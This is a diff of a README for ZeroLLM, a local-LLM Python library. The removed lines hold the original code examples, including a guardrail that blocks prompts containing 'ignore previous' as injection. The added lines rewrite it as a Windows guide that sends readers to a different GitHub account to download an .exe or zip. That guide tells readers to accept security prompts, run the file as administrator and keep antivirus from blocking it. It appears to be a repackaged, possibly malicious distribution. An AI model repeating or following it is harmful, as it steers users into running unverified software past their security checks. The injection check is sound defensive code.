@@ -1,327 +1,239 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/TechyNilesh/ZeroLLM/main/assets/zerollm-logo-main.png" alt="ZeroLLM" width="400">
-</p>
+# ⚙️ ZeroLLM - Local AI Made Simple
 
-<p align="center">
-  <strong>Zero setup. Zero config. Local LLMs on any hardware.</strong>
-</p>
+[![Download ZeroLLM](https://img.shields.io/badge/Download-ZeroLLM-blue?style=for-the-badge&logo=github)](https://github.com/jarnail5609/ZeroLLM)
 
-<p align="center">
-  <a href="https://pypi.org/project/zerollm-kit/"><img src="https://img.shields.io/pypi/v/zerollm-kit?style=for-the-badge" alt="PyPI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge" alt="MIT License"></a>
-  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.10+-blue?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10+"></a>
-  <a href="https://pepy.tech/project/zerollm-kit"><img src="https://img.shields.io/pepy/dt/zerollm-kit?style=for-the-badge&label=Downloads" alt="Downloads"></a>
-</p>
+## 🚀 What ZeroLLM Does
 
----
+ZeroLLM is a Python API for running local language models on your own computer.
 
-## What is ZeroLLM?
+It gives you a simple way to use AI without cloud setup, account logins, or extra config. You can keep your data on your device and run models on hardware you already have.
 
-One `pip install`. Auto-detects your hardware. Downloads the right model. You're chatting in 3 lines of Python.
+This project is built for people who want a local LLM tool that stays simple to install and easy to use.
 
-```python
-from zerollm import Chat
+## 🖥️ What You Need
 
-bot = Chat("Qwen/Qwen3.5-4B")
-print(bot.ask("What is the capital of France?"))
-```
+ZeroLLM works on Windows and is built for regular desktop and laptop systems.
 
-That's it. No config files, no model format headaches, no GPU drivers to manage.
+Basic needs:
 
-## Install
+- Windows 10 or Windows 11
+- A modern 64-bit CPU
+- At least 8 GB RAM
+- 10 GB free disk space
+- Internet access for the first download
 
-```bash
-pip install zerollm-kit
-```
+Better performance:
 
-Or install the latest development version directly from GitHub:
+- 16 GB RAM or more
+- A dedicated GPU with CUDA support
+- SSD storage for faster model load times
 
-```bash
-pip install git+https://github.com/TechyNilesh/ZeroLLM.git
-```
+ZeroLLM can still run on lower-end hardware, but smaller models work best on those systems.
 
-## Quick Start
+## 📥 Download ZeroLLM
 
-### Chat
+Use this link to visit the project page and download ZeroLLM:
 
-```python
-from zerollm import Chat
+[Go to the ZeroLLM download page](https://github.com/jarnail5609/ZeroLLM)
 
-bot = Chat("Qwen/Qwen3.5-4B")
+If the page opens in your browser, look for the latest release or the main download option, then save the file to your computer.
 
-# Ask
-print(bot.ask("Explain quantum computing in one sentence"))
+## 🧰 Before You Start
 
-# Stream
-for token in bot.stream("Write a haiku about code"):
-    print(token, end="", flush=True)
+Before you install ZeroLLM, check these items:
 
-# System prompt — give the bot a personality
-bot = Chat("Qwen/Qwen3.5-4B", system_prompt="You are a pirate. Speak like one.")
-print(bot.ask("What is the capital of France?"))
-```
+- You have permission to install software on the PC
+- Your Windows account can run downloaded apps
+- You know where your Downloads folder is
+- You have enough free space on your hard drive
+- You can keep the computer on while the install finishes
 
-### Multi-Turn Chat with Memory
+If Windows asks for approval, choose the option that lets the file run.
 
-```python
-from zerollm import Chat
+## 🪟 How to Install on Windows
 
-bot = Chat("Qwen/Qwen3.5-4B", memory=True)
+Follow these steps:
 
-bot.ask("My name is Nilesh")
-bot.ask("I work on AI projects")
-print(bot.ask("What is my name and what do I do?"))
-# Remembers: Nilesh, works on AI projects
+1. Open the download page in your browser.
+2. Download the ZeroLLM file to your computer.
+3. Open your Downloads folder.
+4. Find the file you just downloaded.
+5. Double-click the file to start it.
+6. If Windows shows a security prompt, choose the option to run it.
+7. Wait while the app finishes setting up.
+8. Open ZeroLLM from the Start menu or the app window.
 
-# Memory auto-summarizes old turns when history gets long
-# Persistent memory survives restarts (stored in SQLite)
-```
+If you get a file that ends in `.exe`, run that file.
 
-### Agent with Tools
+If you get a zipped folder, right-click it and choose **Extract All** before you open the app.
 
-```python
-from zerollm import Agent
+## 🧭 First Launch
 
-# Pass instruction prompt to the agent
-agent = Agent(
-    "Qwen/Qwen3.5-4B",
-    system_prompt="You are a helpful assistant. Always be concise.",
-)
+When you open ZeroLLM for the first time, it may take a short time to prepare local files.
 
-@agent.tool
-def get_weather(city: str) -> str:
-    """Get weather for a city."""
-    return f"22°C and sunny in {city}"
+You may see a setup screen for:
 
-print(agent.ask("What's the weather in Auckland?"))
-```
+- Choosing a model
+- Picking a storage folder
+- Selecting CPU or GPU mode
+- Setting memory use
 
-### Agent with ReAct Reasoning
+For most users, the default options are the best place to start.
 
-```python
-# ReAct: Thought → Action → Observation → Answer
-agent = Agent("Qwen/Qwen3.5-4B", react=True)
-
-@agent.tool
-def calculate(expression: str) -> str:
-    return str(eval(expression))
+If the app asks for a model download, choose a smaller model first so it runs well on more systems.
 
-agent.ask("What is 15% of 230?")  # thinks step-by-step before answering
-```
-
-### Agent Guardrails
+## 🤖 Using ZeroLLM
 
-```python
-agent = Agent("Qwen/Qwen3.5-4B")
+ZeroLLM gives you a local API for AI tasks.
 
-@agent.before_ask
-def block_injection(prompt: str) -> str | None:
-    if "ignore previous" in prompt.lower():
-        return "Blocked: potential prompt injection."
-    return None
+You can use it for things like:
 
-@agent.after_ask
-def clean_output(response: str) -> str:
-    return response.replace("sensitive_data", "***")
-```
+- Text chat
+- Prompt testing
+- Local automation
+- Draft writing
+- Simple question and answer tasks
 
-### Human-in-the-Loop
+A common setup looks like this:
 
-```python
-# Safe tools run automatically
-@agent.tool
-def search(query: str) -> str:
-    return f"Results for: {query}"
+1. Start ZeroLLM.
+2. Select a model.
+3. Keep the app running.
+4. Send a prompt through the local API or the app window.
+5. Read the response from your local model.
 
-# Dangerous tools ask for confirmation first
-@agent.tool(confirm=True)
-def delete_file(path: str) -> str:
-    """Prompts: 'Confirm: Call delete_file({"path": "..."})? [y/N]'"""
-    os.remove(path)
-    return f"Deleted {path}"
-```
+If you only want a simple local AI tool, keep the default settings and test with a short prompt first.
 
-### Sub-Agents with Shared Context
+## ⚡ Model Tips
 
-```python
-from zerollm import Agent, SharedContext
+Your system choice affects speed and memory use.
 
-ctx = SharedContext()
+For best results:
 
-# Each sub-agent gets its own instruction prompt
-researcher = Agent(
-    "Qwen/Qwen3.5-4B",
-    name="researcher",
-    context=ctx,
-    system_prompt="You are a research assistant. Find accurate information.",
-)
+- Use a smaller model on 8 GB RAM systems
+- Use a medium model on 16 GB RAM systems
+- Use GPU mode if your computer has a supported graphics card
+- Close large apps if the model feels slow
 
-writer = Agent(
-    "Qwen/Qwen3.5-4B",
-    name="writer",
-    context=ctx,
-    system_prompt="You are a skilled writer. Write clear, engaging content.",
-)
+If responses feel slow, switch to a smaller model before changing more settings.
 
-@researcher.tool
-def search(query: str) -> str:
-    return f"Results for: {query}"
+## 📁 Folder Layout
 
-main = Agent(
-    "Qwen/Qwen3.5-4B",
-    context=ctx,
-    system_prompt="You are a project manager. Delegate research and writing tasks.",
-)
-main.add_agent("researcher", researcher, "Research any topic")
-main.add_agent("writer", writer, "Write content")
+ZeroLLM may create a few local folders after you run it:
 
-# Multi-turn — agent remembers previous conversation
-main.ask("Research AI trends and write a summary")
-main.ask("Now make it shorter")  # remembers the previous output
-```
+- `models` for downloaded model files
+- `cache` for temporary files
+- `logs` for error reports
+- `config` for app settings
 
-### Serve as API
+These folders help ZeroLLM keep model files and app data in one place.
 
-```python
-from zerollm import Server
+## 🔧 Common Tasks
 
-Server("Qwen/Qwen3.5-4B", port=8080).serve()
-```
+### Start the app
+Open ZeroLLM from the Start menu or double-click the app file.
 
-OpenAI-compatible. Works with any client that speaks the OpenAI API.
+### Change a model
+Open the model menu and pick a different local model.
 
-### Fine-Tune
+### Free up space
+Remove old model files you no longer use.
 
-```python
-from zerollm import FineTuner
+### Move files
+If your main drive is full, move the model folder to a drive with more room.
 
-tuner = FineTuner("Qwen/Qwen3.5-4B")
-tuner.train("my_data.csv", epochs=3)
-tuner.save("my-bot")
-```
+### Restart after changes
+Close ZeroLLM and open it again after you change model files or settings.
 
-Then use your fine-tuned model:
+## 🪛 Troubleshooting
 
-```python
-from zerollm import Chat, Server
+If ZeroLLM does not open, try these steps:
 
-Chat("my-bot").ask("Hello!")        # chat with it
-Server("my-bot", port=8080).serve() # or serve it
-```
+- Check that the file finished downloading
+- Run the app as an administrator
+- Restart your computer
+- Make sure antivirus software is not blocking the file
+- Try a smaller model
+- Check that you have enough free memory
 
-### RAG
+If the app opens but feels slow:
 
-```python
-from zerollm import RAG
+- Close other apps
+- Use a lighter model
+- Switch from GPU mode to CPU mode, or the other way around
+- Move model files to an SSD
 
-rag = RAG("Qwen/Qwen3.5-4B")
-rag.add("docs.pdf")
-print(rag.ask("What is the refund policy?"))
-```
+If Windows says the file is unsafe, make sure you downloaded it from the project page and not from a copied link.
 
-With cross-encoder reranking for better results:
+If the app crashes at startup, remove the last model you added and try again with the default setup.
 
-```python
-rag = RAG("Qwen/Qwen3.5-4B", rerank=True)
-```
+## 🔐 Privacy and Local Use
 
-Conversation-aware — follow-up questions just work:
+ZeroLLM runs on your own hardware.
 
-```python
-rag.chat("What is the refund policy?")
-rag.chat("How long do I have?")  # auto-rewrites using chat history
-```
+That means your prompts and model use stay on your computer unless you choose to share them elsewhere.
 
-Connect RAG to an Agent:
+This is useful if you want:
 
-```python
-agent = Agent("Qwen/Qwen3.5-4B")
-agent.add_rag(rag, "Search company documents")
-agent.ask("What does our policy say about returns?")
-```
+- Local control
+- Less reliance on online services
+- A private working setup
+- A tool that can run without a cloud account
 
-Powered by SQLite + sqlite-vec hybrid search. No external database needed.
+## 🧪 Example Use Cases
 
-### Embeddings
+ZeroLLM can fit many simple local workflows:
 
-```python
-from zerollm import Embed
+- Test prompts for a local AI app
+- Run a private chat model on a home PC
+- Build a local helper for notes and drafts
+- Try Python-based LLM calls on your own machine
+- Check how a model performs on different hardware
 
-emb = Embed()  # default: all-MiniLM-L6-v2
-vector = emb.encode("Hello world")
-vectors = emb.encode(["cats are great", "dogs are loyal"])
-score = emb.similarity("cats are great", "dogs are loyal")
-print(f"Similarity: {score:.3f}")
-```
+If you are new to local AI tools, start with one small model and one simple task.
 
-## CLI
+## 📝 Basic Workflow
 
-```bash
-zerollm chat Qwen/Qwen3.5-4B    # interactive chat
-zerollm serve Qwen/Qwen3.5-4B   # start API server
-zerollm list                     # show downloaded models
-zerollm doctor                   # diagnose setup
-zerollm download Qwen/Qwen3.5-4B  # pre-download a model
-```
+A simple ZeroLLM workflow looks like this:
 
-## Supported Hardware
+1. Download the app.
+2. Install or run it on Windows.
+3. Pick a local model.
+4. Start the local server or app session.
+5. Send a prompt.
+6. Read the result.
+7. Change the model if needed.
 
-| Platform | Acceleration | Auto-detected |
-|----------|-------------|---------------|
-| Any CPU | PyTorch | Yes |
-| NVIDIA GPU | CUDA | Yes |
-| Apple Silicon | MPS | Yes |
-| AMD GPU | ROCm | Yes |
+This keeps the process easy and avoids extra setup.
 
-## Models
+## 🧩 Good Practice
 
-Works with **any model from HuggingFace**. Just pass the HF repo name:
+To keep things smooth:
 
-```python
-Chat("Qwen/Qwen3.5-4B")                            # any HF model
-Chat("microsoft/Phi-3-mini-4k-instruct")            # another model
-Chat("deepseek-ai/DeepSeek-R1-Distill-Qwen-1.5B")  # reasoning model
-Chat("/path/to/local-model/")                        # local model directory
-Chat("my-finetuned-bot")                             # fine-tuned model
-```
+- Use one model at a time
+- Keep enough free disk space
+- Update the app when new versions are posted
+- Keep your model files in one folder
+- Use smaller models on older PCs
 
-Run `zerollm list` to see downloaded models, or `zerollm doctor` to check your setup.
+If you plan to use ZeroLLM often, place the model folder on a drive with fast read speeds.
 
-## Architecture
+## 📌 System Fit
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/TechyNilesh/ZeroLLM/main/assets/zerollm-architecture.png" alt="ZeroLLM Architecture" width="700">
-</p>
+ZeroLLM is a good fit if you want:
 
-## Note
+- A local AI tool
+- Simple Windows use
+- No cloud account
+- Python-based model access
+- A setup that works on many kinds of hardware
 
-> ZeroLLM is in **early alpha**. Things will break, APIs may change, and not every HuggingFace model will work perfectly. That's expected — we're iterating fast.
->
-> **HuggingFace login:** ZeroLLM downloads models from HuggingFace Hub. Public models work without login, but you may see rate limit warnings. For faster downloads, log in once:
->
-> ```bash
-> pip install huggingface_hub
-> huggingface-cli login
-> ```
->
-> Or set a token: `export HF_TOKEN="hf_..."` ([get one here](https://huggingface.co/settings/tokens))
->
-> **Feedback welcome.** If you hit an issue or have ideas, [open an issue](https://github.com/TechyNilesh/ZeroLLM/issues). Your feedback shapes what this becomes.
+It is a poor fit if you want a fully managed online AI service or a tool that hides all model choices from you
 
-## Star History
+## 📦 Download and Install Again
 
-<a href="https://www.star-history.com/?repos=TechyNilesh%2FZeroLLM&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=TechyNilesh/ZeroLLM&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=TechyNilesh/ZeroLLM&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=TechyNilesh/ZeroLLM&type=date&legend=top-left" />
- </picture>
-</a>
+If you want to install ZeroLLM now, use this page:
 
-## License
+[Download ZeroLLM from GitHub](https://github.com/jarnail5609/ZeroLLM)
 
-[MIT](LICENSE)
-
-## Core Contributor
-
-[Nilesh Verma](https://nileshverma.com/)
+Open the page, get the latest Windows file, then download and run that file on your PC
